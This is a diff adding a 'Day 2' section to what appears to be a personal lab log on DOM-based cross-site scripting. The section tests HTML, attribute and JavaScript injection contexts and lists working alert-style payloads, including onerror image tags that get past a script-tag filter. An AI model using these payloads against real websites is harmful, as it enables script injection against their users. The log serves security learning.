@@ -117,3 +117,84 @@ DOM-based XSS (client-side execution)
 * Burp Suite alone is not sufficient — browser inspection is critical
 
 ---
+
+---
+
+## 🧪 Context Analysis (Day 2)
+
+### 🔍 HTML Context
+
+Test Payload:
+
+```html
+<b>test</b>
+```
+
+Result:
+
+* Input is interpreted as HTML
+* Indicates insertion into DOM as HTML
+
+---
+
+### 🔍 Attribute Context
+
+Test Payload:
+
+```html
+" autofocus onfocus=alert(1) x="
+```
+
+Result:
+
+* Attribute injection attempt blocked or not reflected
+* No successful execution observed
+
+---
+
+### 🔍 JavaScript Context
+
+Test Payload:
+
+```javascript
+";alert(1);//
+```
+
+Result:
+
+* No execution observed
+* Input not injected into JavaScript context
+
+---
+
+### ✅ Confirmed Context
+
+The vulnerability exists in **HTML DOM context**, where user input is inserted into the page without sanitization.
+
+---
+
+### 🔧 Payload Refinement
+
+Working Payload:
+
+```html
+<img src=x onerror=alert(1)>
+```
+
+Additional Variations Tested (Worked):
+
+```html
+<img src=1 onerror=alert(1)>
+<img src=x onerror=confirm(1)>
+<img src=x onerror=alert(document.domain)>
+```
+
+---
+
+### 🧠 Key Insight
+
+* `<script>` tags are filtered or not executed
+* Event-based payloads (`onerror`) successfully bypass restrictions
+* Indicates partial filtering but improper output encoding
+
+---
